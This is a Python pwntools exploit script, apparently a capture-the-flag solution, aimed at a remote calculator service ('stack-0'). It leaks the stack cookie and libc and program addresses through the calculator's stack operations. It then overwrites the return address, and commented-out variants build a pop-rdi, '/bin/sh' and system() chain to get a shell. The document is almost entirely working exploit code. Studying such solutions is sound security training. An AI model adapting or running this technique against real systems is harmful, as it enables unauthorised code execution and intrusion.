#!/usr/bin/env python

from pwn import *
import sys
import time

# pwntools settings
context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'splitw', '-v']

# globals
offset_stack_fn_ret_addr = 0x7c2

# local
offset___libc_start_main_ret = 0x202e1
offset_system = 0x000000000003f480
offset_str_bin_sh = 0x1619d9
# endpoint = process("./stack-0")

# remote
offset___libc_start_main_ret = 0x21b97
offset_system = 0x000000000004f440
offset_str_bin_sh = 0x1b3e9a
endpoint = remote("pwn.reversing.io", 1337)
endpoint.recvuntil("> ")
endpoint.sendline("1")
endpoint.recvuntil("> ")
endpoint.sendline("2")
endpoint.recvuntil("> ")
endpoint.sendline("1")

endpoint.recvuntil("calculator!\n")
time.sleep(1)

def read_base():
    endpoint.send(p8(0))
    endpoint.recvuntil("The base of the calculator stack is ")
    return int(endpoint.recvline().strip())

def push(val):
    endpoint.send(p8(1) + p64(val))

def pop_pop_add_push():
    endpoint.send(p8(2))

def read_stack_var(offset):
    if offset <= 0:
        print("Offset {} can't be <= 0".format(offset))
        sys.exit()

    # fill stack with zeros 
    for i in range(offset):
        push(0)

    for i in range(offset):
        pop_pop_add_push()

    return read_base()

def finish():
    endpoint.send('\n')
    # endpoint.sendline(p8(4))

"""
# implicit return address
push r15
push r14
push r13
push r12
push rbp
push rbx
sub rsp - 0x68
"""
"""
# implicit return address
r15
r14
r13
r12
rbp
rbx
rsp + 0x58: cookie
rsp + 0x10: stack_buffer
"""
stack_contents = [read_stack_var(i) for i in range(1, 20)]
cookie = stack_contents[8]
stack_fn_ret_addr = stack_contents[16]
libc_start_main_ret_addr = stack_contents[18]

# print stack contents
for i, var in enumerate(stack_contents):
    print("{:02}, rsp + {:x}: {:x}".format(i, 0x18 + i*8, var))

print("cookie: {:8x}".format(cookie))
print("stack_fn_ret_addr: {:8x}".format(stack_fn_ret_addr))
print("libc_start_main_ret_addr: {:8x}".format(libc_start_main_ret_addr))
libc_base = libc_start_main_ret_addr - offset___libc_start_main_ret 
system = libc_base + offset_system
str_bin_sh = libc_base + offset_str_bin_sh
program_base = stack_fn_ret_addr - offset_stack_fn_ret_addr

print("libc_base: {:8x}".format(libc_base))
print("program_base: {:8x}".format(program_base))

pop_rdi_gadget = program_base + 0x9fd
# payload = [pop_rdi_gadget, str_bin_sh, system, 0xdeadbeefdeadbeef]
payload = [ program_base + 0x920  ]
# payload = [system, 0xdeadbeefdeadbeef, str_bin_sh]
# payload = [program_base, 0xdeadbeefdeadbeef, str_bin_sh]
stack_contents = [0x4141414141414141 for _ in range(17)] + payload
stack_contents[9] = cookie

for val in stack_contents:
    print("pushing 0x{:016x}".format(val))
    push(val)

# gdb.attach(endpoint)

finish()
endpoint.interactive()
